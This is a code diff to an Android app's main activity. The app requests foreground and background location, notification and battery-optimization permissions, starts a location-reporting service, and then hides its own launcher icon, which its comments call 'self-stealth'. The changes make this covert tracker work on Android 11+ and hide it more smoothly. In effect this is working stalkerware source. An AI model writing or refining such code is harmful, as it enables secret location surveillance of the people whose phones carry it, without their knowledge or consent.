@@ -8,6 +8,8 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.widget.Toast;
@@ -40,7 +42,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ==================== 权限链：前台定位 → 后台定位 → 通知 → 电池优化 → 启动服务 ====================
+    // ==================== 权限链：前台定位 → 后台定位 → 通知 → 启动服务 → 电池优化 → 延迟关闭 ====================
 
     private boolean hasForegroundLocationPermission() {
         if (Build.VERSION.SDK_INT < 23) return true;
@@ -59,10 +61,24 @@ public class MainActivity extends Activity {
         }
     }
 
-    // 前台定位处理完后，进入后台定位申请（Android 10+ 才需要）
+    // 前台定位处理完后，进入后台定位申请
     private void proceedAfterForegroundLocation() {
         if (Build.VERSION.SDK_INT >= 29 && !hasBackgroundLocationPermission()) {
-            requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_BG_LOC);
+            if (Build.VERSION.SDK_INT >= 30) {
+                // Android 11+：无法通过弹窗授予后台定位，引导用户去设置页手动开启
+                // 但不阻塞服务启动——即使没有后台定位，前台服务运行期间仍可获取位置
+                Toast.makeText(this, "建议前往设置开启「始终允许」定位，以确保锁屏后仍可定位", Toast.LENGTH_LONG).show();
+                try {
+                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                } catch (Exception ignored) {}
+                // 不等待用户操作，直接继续走后续流程
+                proceedAfterBackgroundLocation();
+            } else {
+                // Android 10：仍可通过弹窗授予后台定位
+                requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_BG_LOC);
+            }
         } else {
             proceedAfterBackgroundLocation();
         }
@@ -83,12 +99,13 @@ public class MainActivity extends Activity {
         }
     }
 
-    // 通知权限处理完后，引导关闭电池优化，然后启动服务
+    // 通知权限处理完后：先启动服务（服务 onCreate 中立即上报一次），再引导电池优化，最后延迟关闭界面
     private void proceedAfterNotification() {
-        requestIgnoreBatteryOptimizations();
         startTrackingService();
+        requestIgnoreBatteryOptimizations();
     }
 
+    // 引导用户关闭电池优化：只负责跳转，不阻塞服务启动，也不等待返回
     private void requestIgnoreBatteryOptimizations() {
         try {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
@@ -145,8 +162,13 @@ public class MainActivity extends Activity {
         // 初始化完成，自动隐藏桌面图标
         hideLauncherIcon();
 
-        // 瞬间自我隐身关闭
-        finish();
+        // 延迟关闭，给电池优化跳转动画和启动器刷新图标留出时间
+        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                finish();
+            }
+        }, 800);
     }
 
     // 禁用带桌面图标的 VisibleAliasActivity，实现"授权完成后自动隐身"
